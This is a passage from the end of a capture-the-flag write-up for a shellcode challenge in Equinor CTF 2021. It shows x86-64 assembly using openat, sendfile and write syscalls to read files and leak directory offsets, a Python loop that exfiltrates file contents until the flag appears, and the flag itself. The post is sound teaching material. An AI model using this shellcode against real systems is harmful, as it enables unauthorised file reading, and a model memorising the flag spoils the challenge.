</span></span></span><span style=display:flex><span><span style=color:#75715e>                             // 2.6.4); offset is (d_reclen - 1)
</span></span></span><span style=display:flex><span><span style=color:#75715e>   */</span>
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>and we&rsquo;re only interested in <code>d_name</code>, so we have to skip past the other fields (8+8+2=18 bytes). Let&rsquo;s do <code>openat()</code> and access the potential flag file as a descriptor, so it can be sent with <code>sendfile()</code> later.</p><pre tabindex=0><code class=language-assembly data-lang=assembly>/* openat(linux_dirent-&gt;d_name, 0, 0) */
mov ax, 257
lea rsi, [rsp+18]
xor edx, edx
syscall
</code></pre><p>The final piece of the exfiltration puzzle, is to actually transfer the contents. <code>sendfile()</code> can do this.</p><pre tabindex=0><code class=language-assembly data-lang=assembly>/* sendfile(1, fd_from_openat, 0, 200) */
mov esi, eax
xor eax, eax
mov al, 40
xor edi, edi
inc edi
mov r10b, 200
syscall
</code></pre><p>And that&rsquo;s where we ran out of bytes. We now have the contents of one file, but it will take a long time before the first file will contain the flag file, and since this is a üî•-challenge, time is of the essence. Cue the reason why we made <code>OFFSET</code> a variable. It is possible to combine this script with another one that tells us the offset to the next file.</p><p>The new code does everything the same way as the previous blocks, except it replaces <code>openat()+sendfile()</code> with this:</p><pre tabindex=0><code class=language-assembly data-lang=assembly>/* write(1, linux_dirent-&gt;d_off, 8) */
xor eax, eax
inc eax
xor edi, edi
inc edi
lea rsi, [rsp+8]
xor edx, edx
mov dl, 8
syscall
</code></pre><p>Which sends us the offset to the next file structure. We can then feed this offset back into the other script to fetch the contents of the next file, then repeat this over and over. It manages to read quite a lot of files before the 1-minute reset happens, so after just a few minutes we get lucky enough to get the flag.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> subprocess
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> sys
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>curr <span style=color:#f92672>=</span> eval(sys<span style=color:#f92672>.</span>argv[<span style=color:#ae81ff>1</span>]) <span style=color:#66d9ef>if</span> len(sys<span style=color:#f92672>.</span>argv) <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>1</span> <span style=color:#66d9ef>else</span> <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>while</span> <span style=color:#66d9ef>True</span>:
</span></span><span style=display:flex><span>    soln <span style=color:#f92672>=</span> subprocess<span style=color:#f92672>.</span>check_output([<span style=color:#e6db74>&#39;python3&#39;</span>, <span style=color:#e6db74>&#39;get_filedata.py&#39;</span>, str(curr)])
</span></span><span style=display:flex><span>    print(repr(soln))
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> soln<span style=color:#f92672>.</span>startswith(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;EPT&#39;</span>):
</span></span><span style=display:flex><span>        sys<span style=color:#f92672>.</span>exit()
</span></span><span style=display:flex><span>    off <span style=color:#f92672>=</span> subprocess<span style=color:#f92672>.</span>check_output([<span style=color:#e6db74>&#39;python3&#39;</span>, <span style=color:#e6db74>&#39;print_offset.py&#39;</span>, str(curr)])
</span></span><span style=display:flex><span>    print(off)
</span></span><span style=display:flex><span>    curr <span style=color:#f92672>=</span> eval(off)
</span></span></code></pre></div><p>After around 9 minutes, the flag is exfiltrated</p><p>Flag: <code>EPT{y0u_ar3_th3_master_0f_sh3llc0de}</code></p></div><footer class=post-footer><ul class=post-tags><li><a href=https://bootplug.io/tags/ctf/>ctf</a></li><li><a href=https://bootplug.io/tags/web/>web</a></li><li><a href=https://bootplug.io/tags/forensics/>forensics</a></li><li><a href=https://bootplug.io/tags/reversing/>reversing</a></li><li><a href=https://bootplug.io/tags/pwn/>pwn</a></li><li><a href=https://bootplug.io/tags/ics/>ics</a></li><li><a href=https://bootplug.io/tags/crypto/>crypto</a></li></ul><nav class=paginav><a class=prev href=https://bootplug.io/posts/ctf/m0leconctf_2022/><span class=title>¬´ Prev Page</span><br><span>m0leCon CTF 2022 Teaser</span></a></nav><div class=share-buttons><a target=_blank rel="noopener noreferrer" aria-label="share Equinor CTF 2021 on twitter" href="https://twitter.com/intent/tweet/?text=Equinor%20CTF%202021&url=https%3a%2f%2fbootplug.io%2fposts%2fctf%2fequinorctf%2f&hashtags=ctf%2cweb%2cforensics%2creversing%2cpwn%2cics%2ccrypto"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Equinor CTF 2021 on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2fbootplug.io%2fposts%2fctf%2fequinorctf%2f&title=Equinor%20CTF%202021&summary=Equinor%20CTF%202021&source=https%3a%2f%2fbootplug.io%2fposts%2fctf%2fequinorctf%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Equinor CTF 2021 on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fbootplug.io%2fposts%2fctf%2fequinorctf%2f&title=Equinor%20CTF%202021"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Equinor CTF 2021 on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fbootplug.io%2fposts%2fctf%2fequinorctf%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Equinor CTF 2021 on whatsapp" href="https://api.whatsapp.com/send?text=Equinor%20CTF%202021%20-%20https%3a%2f%2fbootplug.io%2fposts%2fctf%2fequinorctf%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Equinor CTF 2021 on telegram" href="https://telegram.me/share/url?text=Equinor%20CTF%202021&url=https%3a%2f%2fbootplug.io%2fposts%2fctf%2fequinorctf%2f"><svg viewBox="2 2 28 28"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></div></footer></article></main><footer class=footer><span>&copy; 2022 <a href=https://bootplug.io/>Blog | bootplug</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://git.io/hugopapermod rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script>let menu=document.getElementById("menu");menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)},document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(t){t.preventDefault();var e=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(e)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(e)}']`).scrollIntoView({behavior:"smooth"}),e==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${e}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(t=>{const n=t.parentNode.parentNode,e=document.createElement("button");e.classList.add("copy-code"),e.innerText="copy";function s(){e.innerText="copied!",setTimeout(()=>{e.innerText="copy"},2e3)}e.addEventListener("click",o=>{if("clipboard"in navigator){navigator.clipboard.writeText(t.textContent),s();return}const e=document.createRange();e.selectNodeContents(t);const n=window.getSelection();n.removeAllRanges(),n.addRange(e);try{document.execCommand("copy"),s()}catch(e){}n.removeRange(e)}),n.classList.contains("highlight")?n.appendChild(e):n.parentNode.firstChild==n||(t.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?t.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(e):t.parentNode.appendChild(e))})</script></body></html>